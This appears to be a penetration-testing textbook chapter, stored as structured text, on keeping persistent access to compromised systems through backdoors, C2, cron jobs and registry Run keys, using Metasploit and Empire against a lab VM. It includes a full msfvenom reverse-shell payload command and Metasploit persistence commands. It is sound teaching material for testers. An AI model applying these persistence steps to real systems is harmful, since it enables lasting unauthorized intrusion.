- en: Maintaining Control within the Environment
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Once you have obtained access to the target environment, you need to look at
    how you can maintain that access so that you are able to return. In a real-world
    attack, the attacker would create multiple backdoors or **Command and Control**
    (**C2**) channels so that access back into the compromised environment is easily
    attainable. In a penetration test, you would do the same.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, you will learn that maintaining access is an important step
    of keeping control of the target system as an exploit you may have used can be
    patched, which ultimately removes your temporary remote access. You will learn
    about the various techniques and tools that can be used and will be able to skillfully
    use the tools described in this chapter to create persistent access to a target
    system.
  prefs: []
  type: TYPE_NORMAL
- en: 'As you progress through this chapter, you will learn about the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: The importance of maintaining access
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Techniques used to maintain access
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using tools for persistence
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following technical requirements are needed for this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: Kali Linux 2019.1
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Metasploitable 3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The importance of maintaining access
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In [Chapter 10](aa2258b0-f6da-4c68-a2e0-d9ef6d53d9ed.xhtml), *Moving Laterally
    and Escalating Your Privileges*, we performed post-exploitation and obtained access
    to the compromised host, which ended with us owning the domain. What happens if
    the vulnerability we exploited is patched or the IT staff have discovered there
    has been a compromise and have taken steps to remediate the gaps, which ultimately
    removes our access? We will need a way to get back into the target network or
    system. Sure, we can try additional exploits or even start from a social engineering
    attack—but this takes time and takes us a number of steps back. This is where
    maintaining access comes into play. Maintaining access should be a top priority
    once you have compromised the initial system. The objective is to obtain a persistent
    presence within the target to obtain a goal of in-depth access.
  prefs: []
  type: TYPE_NORMAL
- en: In the real world, there is a term that is used to define attackers who will
    often remain in a system for months before being detected. They are known as **Advanced
    Persistent Threats** (**APT**). An APT can be an attack campaign, a team of intruders,
    or even nation state actors who have a goal of stealing data, compromising sensitive
    data, or sabotaging critical infrastructure.
  prefs: []
  type: TYPE_NORMAL
- en: Nation state actors are hackers who work for governments or countries in order
    to disrupt or compromise other governments or large organizations. There goal
    is to obtain highly valuable data and intelligence. An example of a nation state
    actor is "Chollima" from North Korea.
  prefs: []
  type: TYPE_NORMAL
- en: During a penetration test, you don't focus on the unethical goals of an advanced
    persistent threat; instead, you focus on obtaining that level of persistence that
    these sophisticated attacks are capable of achieving.
  prefs: []
  type: TYPE_NORMAL
- en: Techniques used to maintain access
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When you initially compromise a target system, you have temporary access. Once
    the system reboots, that access is terminated. There are a number of techniques
    that can be used to maintain access. These span from tools and malware to using
    built-in system tools. Let's consider some of the various techniques that can
    be leveraged to maintain access.
  prefs: []
  type: TYPE_NORMAL
- en: Backdoor
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: A backdoor enables easy access back into the compromised system. Trojans can
    be used for establishing backdoors. A trojan is a type of malware that's disguised
    as legitimate software, with the goal of dropping a malicious payload to enable
    remote access to the system. Trojans are capable of installing themselves as a
    service using privileged access, such as a local system. Trojans can also be used
    for data exfiltration.
  prefs: []
  type: TYPE_NORMAL
- en: The problem with using a trojan is that it can be detected by antivirus technologies.
    As we highlighted in [Chapter 11](9a3e2ffe-5ba3-4028-b0ac-86250f6218ba.xhtml), *Antivirus Evasion*,
    antiviruses have evolved and have sophisticated detection capabilities.
  prefs: []
  type: TYPE_NORMAL
- en: C2
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: C2 servers are used to maintain communication with hosts that are compromised.
    This type of communication can spread from a simple heartbeat to fully-fledged
    commands that use the targeted system as a bot. Since this communication is initiated
    from the compromised host that's outbound to the C2 server, if you use ports that
    are known to be open, such as HTTP/HTTPS, the risk of detection is smaller.
  prefs: []
  type: TYPE_NORMAL
- en: Linux cron jobs
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: On Linux systems, you have the ability to automatically start tasks. **Cron**
    is scheduler and can be used to run specific commands at a given time. These scheduled
    tasks are known as **cron jobs**. Within the operating system, these cron jobs
    are usually used to perform tasks such as backups, deleting log files, and monitoring.
  prefs: []
  type: TYPE_NORMAL
- en: You can leverage a cron job to run payloads that you may have generated using
    tools such as Metasploit. A simpler task can be using a cron job to create a netcat
    session that will connect back to you.
  prefs: []
  type: TYPE_NORMAL
- en: Living off the land
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Living off the land involves using your current operating system's tools to
    perform tasks. For example, you may user PowerShell to perform a number of tasks,
    from reconnaissance to maintaining a backdoor. The registry is a good way to set
    up persistent access. Leveraging the registry allows you to execute batch files
    and executables and even use functions within DLLs.
  prefs: []
  type: TYPE_NORMAL
- en: 'Focusing on the registry, it''s important to understand the difference between
    **HKEY_LOCAL_MACHINE** (**HKLM**) and **HKEY_CURRENT_USER** (**HKCU**). Keys defined
    in **HKLM** are run every time a system is booted, whereas **HKCU** is run once
    a user logs in. The keys that are defined here are the most common ones and are
    used to inject backdoors:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Notice that we have registry keys that are defined as `Run` and `RunOnce`. The
    `RunOnce` keys are run just once during boot or login, and then it is deleted,
    whereas the `Run` keys remain in place.
  prefs: []
  type: TYPE_NORMAL
- en: Using tools for persistence
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Now that we have covered some of the techniques that can be used to maintain
    access, let's focus on some of the tools that are available. The first tool we
    will look at is the Metasploit Framework. The second tool we will cover is Empire.
  prefs: []
  type: TYPE_NORMAL
- en: The Metasploit Framework
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We have covered Metasploit extensively in this book, that is, when we used it
    during many phases of a penetration test. When it comes to persistence, Metasploit
    has modules in this area, too.
  prefs: []
  type: TYPE_NORMAL
- en: My target system is the Metasploitable 3 virtual machine. I exploited it using
    `exploit/windows/smb/ms17_010_eternalblue`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once the meterpreter session has been created, you can use the `run persistence`
    command to leverage the built-in persistence script. We can see the options that
    are available in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a9ac1c02-5c90-4853-8ecd-bd8fb9b06040.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 1: Meterpreter persistence script options'
  prefs: []
  type: TYPE_NORMAL
- en: There is a warning that informs us that the Meterpreter scripts are deprecated
    and that we should use `/post/windows/manage/persistence_exe`. For now, let's
    stick with the deprecated script.
  prefs: []
  type: TYPE_NORMAL
- en: To obtain a persistence shell, we can use the `run persistence -U -i [seconds]
    -p [port] -r [host]` command.
  prefs: []
  type: TYPE_NORMAL
- en: 'This command lets the agent start when the user logs on (`-U`). We define the
    interval in seconds (`-i`); we define the remote port (`-p`) and then the host
    to connect back to (`-r`). Once the script runs, we will see that a registry key
    has been set up and that persistence has been set up using a `.vbs` file:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/4ff054e5-614f-4266-acc2-1d9858fb6bfd.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 2: Persistence setup using Meterpreter script'
  prefs: []
  type: TYPE_NORMAL
- en: Once the persistence script has been installed, the shell will reestablish every
    time the user logs in. However, we need to do one more thing, and that is to create
    a handler. This handler will listen for connections and create the remote session.
  prefs: []
  type: TYPE_NORMAL
- en: 'A simple handler can be set up using the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Remember that `LHOST` is the same IP address that you used in the persistence
    script, and that `LPORT` is the same port you defined in that script too. Once
    these commands have been executed, the reverse handler will start:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/439dc434-00c2-45a9-be39-4cd31d8ee1e8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 3: Creating a handler in Metasploit'
  prefs: []
  type: TYPE_NORMAL
- en: Now, you have everything set up for the remote shell to connect back to you,
    even if the target system has been rebooted. You can test this out by restarting
    the Metasploitable 3 virtual machine. Once the machine boots up and a user logs
    in, the meterpreter session will be established.
  prefs: []
  type: TYPE_NORMAL
- en: Let's look at the recommended post module that meterpreter mentioned earlier.
    In order to use `/post/windows/manage/persistence_exe`, you need to have created
    a payload. I created a simple payload using MSFvenom.
  prefs: []
  type: TYPE_NORMAL
- en: The command that's used to create the `payload.exe` file that you can see in
    the preceding screenshot is `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP
    LPORT=1338 -f exe -o /root/Desktop/payload.exe`.Take note of the port number—it
    is different to the one we used earlier.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once you have generated the payload, you can use the following command within
    a Meterpreter session:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: '`REXEPATH` is used to define the location of the payload you created in your
    Kali environment. `STARTUP` is used to define the startup type (`User`, `System`,
    or `Service`); this will dictate which registry key will be used. Once you enter
    the preceding command, Metasploit will perform the persistence attack and create
    an autorun within the registry, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/8cbb70a3-9617-4f03-b319-36bd6f0e9d30.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 4: Persistence using a malicious payload'
  prefs: []
  type: TYPE_NORMAL
- en: Once this is done and you exit out of them Meterpreter session, create a new
    handler. Remember to define a different port number.
  prefs: []
  type: TYPE_NORMAL
- en: 'In the following screenshot, note the two sessions I established:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/247fb37e-c99b-4e4d-973e-9341b35f7864.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 5: Establishing sessions using Meterpreter'
  prefs: []
  type: TYPE_NORMAL
- en: 'By using `regedit` on the target machine, we can verify that the registry key
    exists:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/1b841f19-605d-4bdb-a586-22780de07999.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6: Registry key created by the persistence modules in Metasploit'
  prefs: []
  type: TYPE_NORMAL
- en: The persistence modules in the Metasploit Framework are really powerful. In
    a real penetration test, if you were using Metasploit to maintain access, you
    would leverage an undetectable payload since the antivirus would probably delete
    the payload being dropped onto the target system's disk.
  prefs: []
  type: TYPE_NORMAL
- en: Empire
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s focus on the persistence modules that Empire offers. These modules are
    broken down into five categories:'
  prefs: []
  type: TYPE_NORMAL
- en: '**PowerBreach**: These focus on memory resident backdoors. These do not persist
    after a reboot.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Userland**: These persist after a reboot but work once a defined user logs
    in. This is not an administrative persistence module.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Elevated**: These allow for persistence using an administrative context.
    They persist after a reboot.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Debugger**: These enable persistence using various tools that are available
    prior to an RDP login. For example, you can leverage a command prompt shell running
    as `SYSTEM` without the need to log in to the target.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Misc**: These are miscellaneous methods of persistence, for example, leveraging
    the Mimikatz tool to obtain the machine account password.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'In the following screenshot, I have an active agent for the Metasploitable
    3 virtual machine:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/66c791f3-fbe0-4d49-ac66-fc4552b20894.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 7: Active agent in Empire'
  prefs: []
  type: TYPE_NORMAL
- en: 'Using the `persistence/userland/registry` module, we will leverage the **HKCU**
    registry hive to implant a persistence module within the user context. This script
    will only run when the user logs in:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/5a7ead32-e1d4-451c-b900-f14338ef3a87.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 8: Using a persistence module in the user context'
  prefs: []
  type: TYPE_NORMAL
- en: Once the command executes, we will receive some output, which defines which
    registry key was modified and that can be added in the script. In the case of
    the userland module, it was set in `HKCU:Software\Microsoft\Windows\CurrentVersion\Debug`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, let''s try an elevated persistence module. We will use the `persistence/elevated/registry`
    module for this. This uses the **HKLM** registry hive to implant a script that
    will run when the target system is booted. We will further modify this module
    to define our own registry location (using the `set RegPath HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run` command)
    and key (using the `set KeyName` command and some random characters):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/c5bad543-550a-4f2e-b5af-ae18e9ef7e30.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 9: Using a persistence module in the elevated system context'
  prefs: []
  type: TYPE_NORMAL
- en: Once the command executes, the registry key will be set and we will have a persistent
    connection to the remote system.
  prefs: []
  type: TYPE_NORMAL
- en: 'Using `regedit` on the target machine, we can verify that the registry key
    exists:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/477ccb3d-4f64-4d16-908c-97f3dbf9fc18.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 10: Registry key set by Empire'
  prefs: []
  type: TYPE_NORMAL
- en: Empire has a wealth of persistence modules that can be used. These span across
    the registry, scheduled tasks, and more. Experimenting with them in your lab will
    help you to gain a good understanding of how each one works.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Maintaining access is an important part of a penetration testing engagement.
    It saves you from having to re-exploit the target system. Remember that the exploit
    you may have used initially could have been patched since you last used it. Therefore,
    you need to have another way of accessing the target system to save you from finding
    new exploits and wasting time.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, you gained insight into the various techniques that can be
    used to maintain access in a target environment. You gained the skills to identify
    specific keys of the Windows registry, and how they can be used for persistence.
    Finally, you learned how to use various tools to maintain access to a target system.
  prefs: []
  type: TYPE_NORMAL
- en: In [Chapter 13](f55668af-c222-4014-9d64-1135149d6215.xhtml), *Reporting and
    Acting on Your Findings*, we will discuss how to write a penetration test report
    and how to identify and recommend remediation steps based on these findings.
  prefs: []
  type: TYPE_NORMAL
- en: Questions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Why do you need to maintain access?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What is an APT?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Name two techniques that can be used to maintain access.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What does "living off the land" mean?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What is the difference between HKCU and HKLM?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
